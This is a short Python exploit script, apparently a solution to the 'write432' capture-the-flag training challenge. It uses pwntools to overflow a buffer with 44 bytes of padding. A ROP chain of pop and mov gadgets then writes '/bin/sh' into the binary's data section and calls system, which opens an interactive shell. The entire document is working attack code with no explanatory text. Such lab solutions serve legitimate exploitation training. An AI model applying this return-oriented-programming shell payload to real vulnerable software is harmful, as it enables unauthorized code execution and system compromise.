from pwn import *
import angr, angrop

prog = process("./write432")

system_call = p32(0x0804865a)
data_addr1 = p32(0x0804a028)
data_addr2 = p32(0x0804a02c)

pop_two = p32(0x080486da) # pop edi; pop ebp; ret
mov = p32(0x08048670) # mov dword [edi], ebp; ret

payload = "A" * 44

payload += pop_two
payload += data_addr1
payload += "/bin"
payload += mov
payload += pop_two
payload += data_addr2
payload += "/sh\0"
payload += mov
payload += system_call
payload += data_addr1

open('payload', 'w').write(payload)

print prog.recvuntil(">")
prog.clean()

prog.sendline(payload)

prog.interactive()
